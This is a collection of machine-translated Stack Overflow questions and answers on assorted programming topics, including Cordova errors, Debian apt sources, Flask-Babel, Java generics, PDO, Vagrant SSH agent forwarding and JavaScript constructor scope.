dc.SubmitChanges(); 
```

# android - cordova.exec 导致我的 Android 项目出现问题

> ID：11955504
> 
> 赞同：0
> 
> 时间：2012-08-14T15:16:42.340
> 
> 标签：android, cordova, ibm-mobilefirst

我有一个`Worklight`正在尝试部署到 Android 的项目（混合应用程序）。目前，它有一个`cordova`用于`PhoneGap`东西的插件。我的项目目前没有使用cordova插件，但是有数百次调用它，所以我想它需要以任何一种方式存在（它是由worklight以这种方式打包的，所以我不太了解它是如何运作的）。

我的问题是Android模拟器在运行项目时不断抛出同样的问题，如下所示：

> 06-13 14:20:57.385：E/Web 控制台（795）：未捕获的类型错误：对象 # 在 file:///data/data/com.Test/files/www/default/wlclient/ 处没有方法“exec” js/wlgap.android.js:697

如果不是那个确切的错误，那是一个类似的错误，它以某种方式抱怨科尔多瓦。我的 JS 文件中充斥着 cordova.exec 调用，我认为这是它失败的地方，因为它找不到该方法。我正在使用定义为cordova.js 的cordova 1.6.1 作为我的Android 项目的一部分。

我不确定如何定义我的问题，因为我不知道从哪里开始让它打球。欢迎任何建议。如果您需要进一步解释我的问题，请告诉我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T23:18:16.380

您使用的是哪个版本的 Worklight？你有你的android应用程序cordova.js文件吗？

{YOUR_PROJECT}\apps{YOUR_APPLICATION}\android\native\assets\www\default\wlclient\js\cordova.js

和

{YOUR_PROJECT}\apps{YOUR_APPLICATION}\android\native\libs\cordova.jar 和

{YOUR_PROJECT}\apps{YOUR_APPLICATION}\android\native\libs\worklight-android.jar

如果您在 Android 环境中没有原生代码，请删除原生文件夹 {YOUR_PROJECT}\apps{YOUR_APPLICATION}\android\native

并再次构建应用程序。

# linux - 安装 Git 时 Debian Squeeze apt-get 错误？

> ID：11955505
> 
> 赞同：0
> 
> 时间：2012-08-14T15:16:49.160
> 
> 标签：linux, git, debian, apt

我是 Linux/Debian 的新手（挤）。我正在尝试执行 apt-get 来安装 git 并收到此错误消息。

> 正在读取包列表...完成构建依赖关系树
> 正在读取状态信息...完成包 git-core 不可用，但被另一个包引用。这可能意味着该软件包丢失、已过时或只能从其他来源获得
> 
> E: 包 'git-core' 没有安装候选

我尝试将我的 sources.list 编辑为以下内容

> # deb cdrom:[Debian GNU/Linux 6.0.5 *Squeeze* - Official i386 DVD Binary-1 20120512-13:45]/ > 挤压 contrib main
> 
> # deb cdrom:[Debian GNU/Linux 6.0.5 *Squeeze* - Official i386 DVD Binary-1 20120512-13:45]/squeeze contrib main
> 
> deb [http://security.debian.org/squeeze/updates](http://security.debian.org/) main contrib deb-src [http://security.debian.org/squeeze/updates](http://security.debian.org/) main contrib
> 
> deb [http://ftp.us.debian.org/debian/squeeze/updates](http://ftp.us.debian.org/debian/) main contrib deb-src [http://ftp.us.debian.org/debian/squeeze/updates](http://ftp.us.debian.org/debian/) main contrib
> 
> deb [http://http.us.debian.org/debian](http://http.us.debian.org/debian) squeeze/updates main contrib deb-src [http://http.us.debian.org/debian](http://http.us.debian.org/debian) squeeze/updates main contrib
> 
> # 挤压更新，以前称为 'volatile'
> 
> # 安装过程中没有选择网络镜像。以下条目
> 
> # 仅作为示例提供，但您应酌情修改它们
> 
> # 为您选择的镜子。
> 
> #
> 
> deb [http://ftp.debian.org/debian/squeeze-updates](http://ftp.debian.org/debian/) main contrib deb-src [http://ftp.debian.org/debian/squeeze-updates](http://ftp.debian.org/debian/) main contrib

正如我所说，我对此很陌生，所以我不知道sources.list 文件中需要包含什么。我现在实际上无法安装任何东西。我也尝试安装php并得到同样的错误。请帮忙 ：（

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-14T15:18:08.647

该`git-core`软件包已过时，请尝试安装`git`.

**编辑**

此外，您的 sources.list 中只有*挤压更新*存储库，添加至少一个常规挤压存储库以访问所有包，而不仅仅是更新的包：

```
deb http://ftp.debian.org/debian/ squeeze main contrib non-free 
```

然后运行`apt-get update`以更新您的本地包索引。

# python - Python、flask、babel-message 和例如西班牙语 - 如何

> ID：11955506
> 
> 赞同：4
> 
> 时间：2012-08-14T15:16:49.833
> 
> 标签：python, flask, python-babel

我对尝试使用带有烧瓶的 babel 进行语言翻译感到非常困惑。

让我们假设以下。用户偏好西班牙语而不是英语。我有一个标记这一点的变量：

```
g.user.default_language='sp' 
```

可以说我必须要显示的消息，一个是英语，另一个是西班牙语。“请”与“赞成”

```
<html>
<h1>INSERT TRANSLATION HERE</h1>
</html> 
```

这是我的基本 babel 配置文件

```
[python: **.py]
[jinja2: **/templates/**.html]
extensions=jinja2.ext.autoescape,jinja2.ext.with_ 
```

那么，如果用户偏好是西班牙语，“请”去哪里以及如何映射到“por fovor”？

那么，如何从基于语言配置文件的模板中调用？

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-15T22:13:14.957

[Flask-Babel](http://packages.python.org/Flask-Babel/)是一个非常棒的项目。如果你在 google 上寻找 jinja、i18n 和 Flask，你会发现一些有用的例子。请参阅[文档](http://jinja.pocoo.org/docs/templates)以获取更多信息。在这里，我将提供一个小例子：

**1\. 创建翻译目录**：

```
my_website/translations/pt/LC_MESSAGES/
my_website/translations/en/LC_MESSAGES/ 
```

假设您的网站是葡萄牙语和英语的。这是一种手动方式。你最好使用`pybabel init` [command](https://pythonhosted.org/Flask-BabelEx/)。

**2\. 创建一个名为 messages.po 的文件（这些文件将包含已翻译的字符串）：**

```
$ touch my_website/translations/pt/LC_MESSAGES/messages.po 
$ printf "msgid \"Hello world\"\nmsgstr \"Olá mundo\"" > my_website/translations/pt/LC_MESSAGES/messages.po
$ cat my_website/translations/pt/LC_MESSAGES/messages.po 
```

它将创建一个包含以下内容的文件：

```
msgid "HELLO WORLD"
msgstr "Olá mundo" 
```

**3.编译翻译**

```
 $ pybabel compile -d translations 
```

**4\. 将此行代码添加到烧瓶的主应用程序文件中。**

```
app.config['BABEL_DEFAULT_LOCALE'] = 'pt_BR' #(context locale to load language). 
```

**5\. 使用`_()`jinja 模板文件中的函数来查看*Olá mundo*字符串。**

```
<h1>{{ _('HELLO WORLD') }}</h1> 
```

我希望它会有用。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-14T15:42:53.893

您是否按照指南中的说明运行了 pybabel 翻译？[http://packages.python.org/Flask-Babel/](http://packages.python.org/Flask-Babel/)

并查看[http://jinja.pocoo.org/docs/templates/#i18n-in-templates](http://jinja.pocoo.org/docs/templates/#i18n-in-templates)和[http://jinja.pocoo.org/docs/integration/#babel-integration](http://jinja.pocoo.org/docs/integration/#babel-integration)

看来您可以简单地使用`_()`

# java - 在 Java 中运行 Bash 脚本

> ID：11955509
> 
> 赞同：0
> 
> 时间：2012-08-14T15:17:07.703
> 
> 标签：java, ubuntu, terminal, usb

所以本质上，我正在尝试运行命令“/dir/command -arg”来更改 Java 中 USB 设备上的 LED 颜色。我正在使用 Ubuntu 10.04。当我从终端运行命令时，它工作得很好。

但是，我尝试了我能找到的 Runtime.exec() 的每一次迭代，但它们似乎都不起作用。然后我创建了一个包含以下内容的脚本：

```
#!/bin/bash
echo "hello"
/dir/command -arg 
```

当我从终端运行它时，它工作得很好。但是，当我跑步时

```
@Override
public void run() {
    String[] lookupCmd = {"/bin/sh","-c", "sh /dir/script.sh"};
    try {
      Runtime runtime = Runtime.getRuntime();
      Process lookupProc = runtime.exec(lookupCmd);
      lookupProc.waitFor();
      BufferedReader reader = new BufferedReader(new InputStreamReader(lookupProc.getInputStream()));
      String line = reader.readLine();        
      while (line != null) {
        id.add(line);
        System.out.println(line);
        line = reader.readLine();
      }
    } catch (Exception e) {
      System.err.println(e);
    }
  } 
```

“你好”打印，但没有别的。没有错误。

我的其他命令不应该产生任何输出，而只是改变 LED 的颜色。但是，当我使用相同的命令但产生输出的不同 arg 运行它时，它仍然只打印“hello”。

我还确保我的用户有权使用 USB 设备访问 /dev 文件夹。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-15T15:28:36.307

I wasn't running the error stream, so I've added that.

After that I realized I was missing an environment variable, so added:

```
String[] envar = {"VAR=path"} 
```

and called:

```
runtime.exec(lookupCmd, envar); 
```

Works great now.

# java - 对比

> ID：11955515
> 
> 赞同：8
> 
> 时间：2012-08-14T15:17:40.653
> 
> 标签：java, generics

我有点困惑。

我有一个类，它不是一个集合，但它确实引用了通用对象：

```
 public class XClass<E extends AnInterface>{

        E instanceobject;

        public void add(E toAdd){}
    }

    public interface AnInterface{}

    public class A implements AnInterface{}

    public class B implements AnInterface{} 
```

我相信我在某个地方读到`<? extends AnInterface>`了要使用的东西（在声明 XClass 的实例时），如果你想同时在泛型对象中使用多个子类型，而`<T extends AnInterface>`只允许你在泛型类中拥有单一类型的子类型立刻？

但是，我可以使用：

```
 XClass<AnInterface> xc = new XClass<AnInterface>();

    A a = new A();
    B b = new B();

    xc.add(a);
    xc.add(b); 
```

这样我就可以将 Supertype 的多个子类型传递给泛型类......

我没有看到使用“？”的目的。使用接口作为通用参数有什么问题吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-14T15:26:53.063

之所以可以添加这两种类型的对象，`A`是`B`因为您使用接口对 XClass 进行了参数化，因此添加两个实现该接口的不同类没有任何问题。

另一方面，如果您将 XClass 定义为：

```
XClass<A> xc = new XClass<A>(); 
```

那么表达式`xc.add(b);`将给出编译错误，因为添加的所有对象都必须具有与声明的类型相同的类型，在本例中为 A。

例如，如果您声明您`xc`为：

`XClass<? extends AnInterface> xc = new XClass<AnInterface>();`

`a`那么添加or就不再合法了`b`，因为我们唯一知道的是 xc 是 的某个未知**但固定**的子类型`AnInterface`，并且无法知道该未知类型是`A`or`B`还是其他任何类型。

但是，假设您正在编写一个方法来接受一个 XClass 类型，您可以迭代之前添加的元素。您唯一的限制（为了示例）是项目 extend `AnInterface`，您不在乎实际类型是什么。

您可以像这样声明此方法：

```
public static void dummyMethod(XClass<? extends AnInterface> dummy){
//do stuff here, all the elements extend (implement in this case), AnInterface, go wild.
} 
```

现在您可以将`XClass<A>`,`XClass<B>`或之类的任何内容传递给此方法`XClass<AnInterface>`，这一切都将是有效的。

请记住，出于与上述相同的原因，您无法添加到传递的对象中。我们不知道未知类型是什么！

```
public static void dummyMethod(XClass<? extends AnInterface> dummy){
//do stuff here, all the elements extend (implement in this case), AnInterface, go wild.
    dummy.add(new A()); //you can't do this, we have no idea what type ? stand for in this case
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T15:30:11.323

如果您`E`想让 XClass 的实例仅使用一个子类，`AnInterface`而没有其他实现`AnInterface`不扩展/实现的类，则可以使用`E`。

例如给出 `public class ClassOne implements AnInterface {}`和`public class ClassTwo implements AnInterface {}`

如果你要使用 `public class XClass<E extends AnInterface>`，`<ClassOne>XClass xc = new <ClassOne>XClass()`那么你只能`ClassOne`在你的 add 方法中使用一个对象，而不是`ClassTwo`. 使用 ？将允许您传入任何实现的类`AnInterface`，要么`ClassOne`或`ClassTw`o。

使用标识符`E`意味着“对于这个对象，我想使用类型 E 和任何子类”，使用？表示“我想使用与表达式匹配的任何类型”

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-14T15:36:03.640

在您的示例中，您需要在“add”方法中进行[类型擦除](http://docs.oracle.com/javase/tutorial/java/generics/genTypes.html)，因此您不应在类中使用通配符。

通配符仅在您不需要类型擦除时使用（即，您不关心类型，只要它是.. 的子类）以及当您需要对泛型本身进行[子类型化时。](http://docs.oracle.com/javase/tutorial/java/generics/subtyping.html)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-14T15:40:29.947

通配符只是意味着它将是满足该标准的某个类。所以 ？extends AnInterface 意味着它将是一个（也是唯一一个）扩展 AnInterface 的类。

所以它可能是：

```
XClass<Impl1>
XClass<Impl2> 
```

ETC...

但是，在运行时，您不知道该类将是什么。由于这个原因，调用将实际类型作为参数的方法本质上是不安全的，因为编译器不可能知道参数是否适合实际实例化的实例。

以列表为例。可能会这样声明：

```
List<? extends Number> list = new ArrayList<Integer>(); 
```

如果您尝试执行以下任一操作会发生什么：

```
list.add(new Double(0));
list.add((Number) new Long(1L)); 
```

它不会编译，因为泛型参数类型在编译时是未知的。因此编译器无法判断 Double 或 Number 是否适合传递给实际实例（在这种情况下`ArrayList<Integer>`）。这是当你得到臭名昭著的捕获编译错误的时候。

然而，这是允许的，因为您在编译时确定该列表可以采用 Number 的任何实例（包括子类）。

```
List<Number> list = new ArrayList<Number>();
list.add(new Double(0));
list.add((Number) new Long(1L)); 
```

# php - PDO - AzureSQL 返回结果时的“无字段”结果

> ID：11955516
> 
> 赞同：0
> 
> 时间：2012-08-14T15:17:42.127
> 
> 标签：php, azure, pdo

我正在使用 PDO::query 运行以下 SQL 语句：

```
INSERT INTO pages (template_id,user_id,page_default,page_internal_title,page_menu_text,page_nav_link,globalcontent_id,page_parent_id,page_order,page_active,page_show_in_menu,page_hide,page_created,page_updated,page_deleted,page_type) values (
4,1,'n','Test',
...snip...
'n','page');SELECT LAST_INSERT_ID=@@IDENTITY 
```

如果我在 AzureSQL 管理器中运行直接按预期执行插入并返回 last_insert_id 它应该。

但是，当我调用`fetchAll()`从 PDO::query 返回的语句对象时，它会抛出“查询的活动结果不包含任何字段”。例外。PDO::query 正在工作，因为正在插入行，但好像选择失败（但此时它没有抛出异常），或者有一些明显的东西我错过了（很可能）。

任何帮助都会很棒！

干杯!

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T16:07:48.800

你试过[`PDO::lastInsertId()`](http://www.php.net/manual/en/pdo.lastinsertid.php)吗？

我很确定我读过关于 PDO 的 MSSQL 不支持多个结果集，但我目前找不到参考：-/。如果您的场景允许您使用上述功能，这可能是最简单的解决方案。

# asp.net-mvc-3 - 在视图 MVC 中的区域上附加数据

> ID：11955524
> 
> 赞同：0
> 
> 时间：2012-08-14T15:18:32.487
> 
> 标签：asp.net-mvc-3, jquery

```
$("#@ViewBag.PageGroupID").append(data); 
```

现在`ViewBag.PageGroupID`在运行时返回 div 的 id。如果我想在 div 中附加数据（我将在运行时获得的 id）怎么办。我该如何实现呢？

```
$('#btnPageElementClick').click(function () { 
   var flag = false; 
   var b; 
   $.ajax({ type: 'GET', url: '/ScriptedTestCase/pageElementPV/' +     $('#PageElements').val(), data: null, 
    success: function (data) 
    { 
       $("#@ViewBag.PageGroupID").append(data); //where divID is the id of the div you append the data. 
    } 
   }); 
return false; 
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T16:12:31.367

确保在呈现包含您显示的脚本的视图的控制器操作中，您实际设置了以下数据：

```
ViewBag.PageGroupID = "someDivId"; 
```

另请注意，在 HTML 中，id 不能以数字开头。

# ssh - 如何通过“vagrant ssh”使用 ssh 代理转发？

> ID：11955525
> 
> 赞同：109
> 
> 时间：2012-08-14T15:18:34.210
> 
> 标签：ssh, virtualbox, forwarding, ssh-keys, vagrant

我不想在 vagrant box 上创建新的 SSH 密钥对，而是想重新使用主机上的密钥对，使用[代理转发](http://www.unixwiz.net/techtips/ssh-agent-forwarding.html)。我尝试在 Vagrantfile 中将[config.ssh.forward_agent设置为 TRUE，然后重新启动 VM，并尝试使用：](http://vagrantup.com/v1/docs/config/ssh/forward_agent.html)

```
vagrant ssh -- -A 
```

...但是当我尝试执行 git checkout 时，仍然会提示我输入密码。知道我错过了什么吗？

* * *

## 回答 #1

> 赞同：90
> 
> 时间：2013-04-21T03:28:56.193

我在 OS X Mountain Lion 上使用 vagrant 2。

```
Vagrant.configure("2") do |config|
  config.ssh.private_key_path = "~/.ssh/id_rsa"
  config.ssh.forward_agent = true
end 
```

1.  `config.ssh.private_key_path`是你的本地私钥
2.  您的私钥必须对本地 ssh-agent 可用。您可以使用 进行检查`ssh-add -L`，如果未列出，请添加`ssh-add ~/.ssh/id_rsa`
3.  不要忘记将您的公钥添加到`~/.ssh/authorized_keys`Vagrant VM 上。您可以复制粘贴或使用[ssh-copy-id 之类的工具](http://linux.die.net/man/1/ssh-copy-id)

* * *

## 回答 #2

> 赞同：84
> 
> 时间：2012-08-23T06:10:07.603

将其添加到 Vagrantfile

```
Vagrant::Config.run do |config|
   # stuff
   config.ssh.forward_agent = true
end 
```

[查看文档](https://www.vagrantup.com/docs/vagrantfile/ssh_settings.html#config-ssh-forward_agent)

* * *

## 回答 #3

> 赞同：20
> 
> 时间：2013-07-26T13:55:11.463

除了将“config.ssh.forward_agent = true”添加到 vagrant 文件之外，请确保主机已设置为代理转发。Github 对此提供了[很好的指导](https://help.github.com/articles/using-ssh-agent-forwarding)。（查看故障排除部分）。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2014-03-14T00:53:00.260

我在 1.4.3 上使用了上述回复，但在 1.5 上停止了工作。我现在必须运行`ssh-add`才能完全使用 1.5。

现在，我将以下行添加到我的 ansible 配置脚本中。 `- name: Make sure ssk keys are passed to guest. local_action: command ssh-add`

我还创建了我的设置要点：[https ://gist.github.com/KyleJamesWalker/9538912](https://gist.github.com/KyleJamesWalker/9538912)

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2014-07-14T19:04:01.990

如果您在 Windows 上，默认情况下 Vagrant 中的 SSH 转发无法正常工作（因为 net-ssh 中的错误）。请参阅此特定的 Vagrant 错误报告：[https ://github.com/mitchellh/vagrant/issues/1735](https://github.com/mitchellh/vagrant/issues/1735)

但是，有一个解决方法！只需通过 VagrantFile 中的简单配置脚本将本地 SSH 密钥自动复制到 Vagrant VM。这是一个例子： [https ://github.com/mitchellh/vagrant/issues/1735#issuecomment-25640783](https://github.com/mitchellh/vagrant/issues/1735#issuecomment-25640783)

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2013-04-11T15:03:07.767

当我们最近在 Vagrant 1.1.5 中试用该`vagrant-aws`插件时，我们遇到了 SSH 代理转发的问题。事实证明，Vag​​rant 在`IdentitiesOnly=yes`没有选项的情况下强制将其更改为`no`. `Vagrantfile`这迫使 Vagrant 只查看我们在AWS 提供商中列出的私钥。

我在[一篇博文](http://www.benjaminoakes.com/2013/04/10/ssh-agent-forwarding-with-vagrant-aws/)中记录了我们的经历。它可能会在某个时候变成拉取请求。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2017-03-15T09:52:25.147

确保 VM 不会启动自己的 SSH 代理。我有这条线`~/.profile`

```
eval `ssh-agent` 
```

删除它后，SSH 代理转发工作。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2015-03-03T22:52:05.213

真正的问题是 Vagrant 使用 127.0.0.1:2222 作为默认端口转发。可以加一个（不是2222，默认2222已经占用）

**config.vm.network “forwarded_port”，来宾：22，主机：2333，host_ip：“0.0.0.0”**

“0.0.0.0”是从外部连接请求的方式。然后 ssh -p 2333 vagrant@192.168.2.101 （更改为您自己的主机 IP 地址，dud）将正常工作。谢谢我，就叫我雷锋吧！

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2018-01-15T18:38:44.173

在 Windows 上，问题在于 Vagrant 不知道如何与 git-bash 的 ssh-agent 通信。但是，它确实知道如何使用 PuTTY 的 Pageant。因此，只要 Pageant 正在运行并加载了您的 SSH 密钥，并且只要您设置了 config.ssh.forward_agent，这应该可以工作。

有关详细信息，请参阅[此评论](https://github.com/hashicorp/vagrant/issues/1735#issuecomment-25640783)。

如果您使用 Pageant，则不再需要[更新 Vagrantfile 以在 Windows 上复制 SSH 密钥的解决方法。](https://stackoverflow.com/a/24743876/25507)

# javascript - JavaScript 构造函数中的“var”变量会发生什么？

> ID：11955538
> 
> 赞同：17
> 
> 时间：2012-08-14T15:19:19.730
> 
> 标签：javascript, constructor, var

例子：

```
function Foo() {
    this.bla = 1;
    var blabla = 10;
    blablabla = 100;
    this.getBlabla = function () { 
        return blabla; // exposes blabla outside
    }
}

foo = new Foo(); 
```

**原始问题：**

我知道这`bla`将分配给 Foo 的每个实例。会发生什么`blabla`？

**新问题：**

我现在理解的：

```
this.bla = 1;     // will become an attribute of every instance of FOO.
var blabla = 10;  // will become a local variable of Foo(**not** an attribute of every    instance of FOO), which could be accessed by any instance of FOO only if there's a method like "this.getBlabla".
blablabla = 100;  // will define a **new** (or change if exist) global(window) variable. 
```

**[问题：]**我理解正确吗？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-14T15:30:14.843

您提供给的任何内部方法`this`- 即：`this.method = function () {};` ***在***您的 Foo 构造函数内部时，都***将***具有对对象`blahblah`的每个实例唯一的引用`Foo`。

```
function Wallet () {
    var balance = 0;
    this.checkBalance = function () { return balance; };
    this.depositAmount = function (amount) { balance += amount; };
}

var wallet = new Wallet();
wallet.checkBalance();   // 0
wallet.depositAmount(3);
wallet.checkBalance();   // 3 
```

但它完全不受钱包外部访问的保护，除非您通过特权功能将其归还给某人。

```
wallet.balance; // undefined; 
```

（增加了一点兴趣——如果`balance`是 a `string`、 a`number`或 a `boolean`，即使你返回它，也不会赋予人们编辑权限，甚至是永久查看权限——标量变量是按值传递的，所以你只是**当时**传递 balance 的值——但是，如果 balance 是 an `object`、 a`function`或 an `array`，他们将有永久访问权限来修改你内部工作中的废话）

注意：必须在构造函数内部分配方法***才能***使其工作。原型无法访问内部变量。稍后添加方法不会让他们访问内部变量。

这意味着每个实例将占用更多内存，因为每个实例都有自己的方法副本，并且拥有自己的 var 副本。但是，如果您正在做的事情需要私人数据，这将是获取它的好方法。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-08-14T15:29:12.673

在您的示例`blabla`中是一个局部变量，因此当构造函数结束时它将消失。

如果你在构造函数中声明一个使用变量的函数，那么变量将成为该函数闭包的一部分，并且与函数一样长（即通常与对象一样长）：

```
function Foo() {
  this.bla = 1;
  var blabla = 10;

  this.getBlabla = function() {
    alert(blabla); // still here
  }
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-14T15:20:58.740

它将成为. **_** `Foo()`这意味着您无法在`Foo()`.

```
function Foo() {
  this.bla = 1; // this becomes an extension of Foo()
  var blabla = 10; // this becomes a "Local" (sort of like a 'private') variable
} 
```

您可以使用 Foo 方法公开它（通过返回它）。

```
function Foo() {
    var blabla = 10; // local

    this.getBlabla = function () { 
        return blabla; // exposes blabla outside
    }
} 
```

现在在 Foo() 之外：

```
var FooBar = new Foo();

var what_is_blabla = FooBar.getBlabla(); //what_is_blabla will be 10 
```

[**jsFiddle 演示**](http://jsfiddle.net/JYqpE/)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-14T15:21:42.000

`var`在用作构造函数的函数内声明的变量将与在任何函数内声明的所有其他变量一样，`var`仅在该函数执行期间可见（除非该值使用闭包关闭）。

换句话说，`blabla`在函数之外实际上是不可见的：

```
var foo = new Foo();
console.log(foo.bla);     // 1
console.log(foo.blabla);  // throws NameError 
```

通过定义关闭这些变量的函数，它们成为 JavaScript 最接近“私有”变量的东西：

```
function Foo() {
    this.bla = 1;
    var private = 1;

    this.increment = function() {
        ++private;
    }

    this.getPrivateValue = function() {
        return private;
    }
}

foo = new Foo();
console.log(foo.bla);                // 1
foo.bla = 6;                         // legal
console.log(foo.bla);                // 6
console.log(foo.getPrivateValue());  // 1
// console.log(foo.private);         // would throw an error
foo.increment();                     // legal
console.log(foo.getPrivateValue());  // 2
// foo.getPrivateValue() = 5;        // syntax error. Still can't reassign to private no matter what you try! 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-14T15:21:00.017

该变量是构造函数的本地变量，并且不能在该范围之外访问（无论是通过`this`还是其他方式），除非它被闭包捕获。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-14T15:21:54.137

如果不使用 var 关键字，“blabla”将成为全局变量。在代码中的其他点，如果您还使用不带 var 的 blabla，它也将是全局的，您可能会意外更改 blabla 的其他实例并在代码中引入意外错误。“var” 将变量放在当前范围内，所以在上面的例子中，它只能被 Foo 访问。

* * *

## 回答 #7

> 赞同：-2
> 
> 时间：2012-08-14T15:21:50.193

`blabla`几乎可以被认为是 的私人成员`Foo`。

请参阅Douglas Crockford 的[这篇](http://javascript.crockford.com/private.html)文章。

# internet-explorer - CSS3 PIE - 让它在 Internet Explorer 上运行

> ID：11955541
> 
> 赞同：0
> 
> 时间：2012-08-14T15:19:35.223
> 
> 标签：internet-explorer, css, css3pie

我想纠正我的网站在 IE 上加载时遇到的问题。我进行了搜索，发现 PIE 的描述看起来是一个很好的解决方案。

但是，在查看了此处和 pie 的官方网站上的一些帖子后，我无法使其正常工作。

首先，我只是将 PIE.htc 文件放在我网站的文件夹中。但是为什么我从 PIE 网站下载的文件夹中有其他文件呢？不需要他们吗？

其次，我正在应用这种方式在 IE 上制作圆角？

```
 ul#menu span.description{
    width:120px;
    height:100px;
    background-color:#99FF33;
    border:3px solid #0000FF;
    color:#FFFFFF;
    display:block;
    font-size:22px;
    padding:10px;
    -moz-box-shadow:1px 1px 6px #000;
    -webkit-box-shadow:1px 1px 6px #000;
    box-shadow:1px 1px 6px #000;
    -moz-border-radius:10px;
    -webkit-border-radius:10px;
    border-radius:10px;
    -pie-border-radius:10px;
    behavior: url(PIE.htc);
} 
```

这是错的吗？

最后，在我在这里进行搜索之后，我读到了一些关于将 .htaccess 文件添加到与 PIE.htc 文件夹相同的位置的内容。但我有一些疑问。我可以给文件和扩展名“.htaccess”命名吗？那是我需要做的吗？这就是我在文件中使用以下代码所做的：

```
AddType text/x-component .htc 
```

尽管如此，毕竟我无法在 IE 8 上看到圆角？有什么提示吗？

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T15:21:50.963

.htc 文件的路径与引用它的 CSS 文档相关。

查看调试器（IE 中的 F12）并确保它在网络控制台中请求正确的文件并获得良好的响应。

# c# - 一张表格涉及多个数据表

> ID：11955544
> 
> 赞同：0
> 
> 时间：2012-08-14T15:19:47.413
> 
> 标签：c#, asp.net-mvc-3, linq, entity-framework

更新于 2012 年 8 月 14 日下午 12:05 我将尝试解释我的情况，希望有人能指出我正确的方向。

我的项目中有一个表格，其中包含多个表格，所有表格都已经设置了关系。以下是相关的模型。

```
namespace QQAForm.Models
 {
  public class AuditSchedule
    {
    public virtual int AuditScheduleID { get; set; }
    public virtual Nullable<DateTime> audit_completed_date { get; set; }
    public virtual string gl_cmp_key { get; set; }
    public virtual string audit_year { get; set; }
    public virtual string ar_ship_key { get; set; }
    public virtual string ar_ship_name { get; set; }
    public virtual string im_adres_city { get; set; }
    public virtual string im_adres_state { get; set; }
    public virtual string audit_type { get; set; }
    public virtual string audit_no { get; set; }
    public virtual string audit_group { get; set; }
    public virtual string Footage { get; set; }
    public virtual string Rolling3MosFootage { get; set; }
    public virtual string snp_SalesRep8 { get; set; }
    public virtual string epg_sales_rep_accountable { get; set; }
    public virtual string tech_service_rep { get; set; }
    public virtual string audit_done_by { get; set; }
    public virtual Nullable<DateTime> audit_recieved_date { get; set; }
    public virtual string audit_notes { get; set; }
    public virtual string audit_pdf { get; set; }
    public virtual string updated { get; set; }
    public virtual string hidden { get; set; }
    public virtual string en_stats_key { get; set; }
    public virtual string Control_ID { get; set; }
    public virtual Nullable<DateTime> audit_date { get; set; }
    public virtual string contacts_present { get; set; }
    public virtual string audit_furnished_to { get; set; }
    public virtual string spacer_type { get; set; }

   }
} 
```

主要问题：

```
namespace QQAForm.Models
{
public class MainQuestion
    {
    public virtual int MainQuestionID { get; set; }
    public virtual int SubCategoryID { get; set; }
    public virtual int ReferenceNo { get; set; }
    public virtual int DisplayIndex { get; set; }
    public virtual int SuggestionID { get; set; }
    public virtual string Question { get; set; }

    public virtual SubCategory SubCategory { get; set; }

    public virtual ICollection<Suggestion> suggestions { get; set; }
    public virtual ICollection<DocumentLink> documentLink { get; set; }
    }
 } 
```

儿童问题：

```
namespace QQAForm.Models
{
public class ChildQuestion
    {
    public virtual int ChildQuestionID { get; set; }
    public virtual int MainQuestionID { get; set; }
    public virtual int ReferenceNo { get; set; }
    public virtual int DisplayIndex { get; set; }
    public virtual string QuestionText { get; set; }
    public virtual string UserEntityType { get; set; }
    public virtual string UserEntityTexts { get; set; }

    public virtual MainQuestion MainQuestion { get; set; }

    }
 } 
```

建议：

```
namespace QQAForm.Models
{
public class Suggestion
    {
    public virtual int SuggestionID { get; set; }
    public virtual int MainQuestionID { get; set; }
    public virtual int DisplayIndex { get; set; }
    public virtual string ReferenceNo { get; set; }
    public virtual string Suggestions { get; set; }

    public virtual MainQuestion MainQuestion { get; set; }
   }
} 
```

主要答案：

```
namespace QQAForm.Models
{
public class MainAnswer
    {
    public virtual int MainAnswerID { get; set; }
    public virtual int AuditScheduleID { get; set; }
    public virtual int MainQuestionID { get; set; }
    public virtual string Score { get; set; }
    public virtual string AdditionalNotes { get; set; }

    public virtual AuditSchedule AuditSchedule { get; set; }
    public virtual MainQuestion MainQuestion { get; set; }

    }
 } 
```

我很难弄清楚如何从一个表中显示与另一个表有关系的问题，其中包含子问题和答案复选框。答案很简单，是、否和不适用。他们也被放在不同的桌子上。我在数据表中拥有所有这些的原因是它们必须是可编辑的，或者我想添加到这些区域中。这就是页面应该的样子。我有 incerted 文本给页面的外观。

布局：

```
<html>
<head>
<title>@ViewBag.Title</title>
<link href="@Url.Content("~/Content/Site.css")" rel="stylesheet" type="text/css" />
<script src="@Url.Content("~/Scripts/jquery-1.5.1.min.js")" type="text/javascript">  </script>
</head>
<body>
<div id="head" class="container">
    @Html.Partial("Header")
 </div>
    <div class="container">
        <div id="main">
            <ul id="breadcrumbs">

            </ul>
            <div id="formTopCol">
              @RenderBody()
              @*@Html.Partial("_Audit")*@  
            </div>
            <div id="formBottomCol">
                    @Html.Action("_SubCategory")

                <div id="formBottomRightCol">
                    @Html.Action("_Forms")
                    @*@RenderBody()*@
                </div>
                <div style="clear:left;"></div>
            </div>
        </div>
    </div>  
    <div class="container">
       @Html.Partial("Footer")
